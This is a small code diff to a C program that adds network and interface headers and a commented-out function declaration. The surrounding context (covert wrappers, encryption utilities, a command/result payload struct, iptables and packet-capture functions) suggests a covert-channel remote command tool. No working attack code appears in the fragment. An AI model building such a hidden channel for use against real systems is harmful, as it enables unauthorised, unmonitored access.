@@ -18,6 +18,9 @@
 #include <stdio.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <getopt.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
 #include "../src/encrypt_utils.h"
 #include "../src/socketwrappers.h"
 #include "../src/covert_wrappers.h"
@@ -92,6 +95,8 @@ struct payload{
     char buffer[1024]; // for either commands or results
 };
 
+
+//char GetLocalIP(char *device);
 char* iptables(char *port, char *ip, char *protocol);
 int Packetcapture();
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
